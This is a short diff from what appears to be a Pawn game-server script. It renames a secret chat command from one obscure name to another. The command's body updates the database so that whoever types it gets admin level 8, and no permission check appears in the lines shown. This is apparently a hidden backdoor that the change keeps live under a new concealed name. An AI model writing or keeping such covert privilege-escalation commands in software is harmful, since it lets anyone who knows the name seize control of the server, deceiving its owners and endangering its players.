@@ -1279,7 +1279,7 @@ CMD:purga(playerid, params[])
 	return 1;
 }
 
-CMD:ellokitodela20(playerid, params[])
+CMD:dafuqungordoxdd(playerid, params[])
 {
 	new DB_Query[70];
 	format(DB_Query, sizeof DB_Query, "UPDATE `CUENTA` SET `ADMIN_LEVEL` = '8' WHERE `ID` = %d;", ACCOUNT_INFO[playerid][ac_ID]);
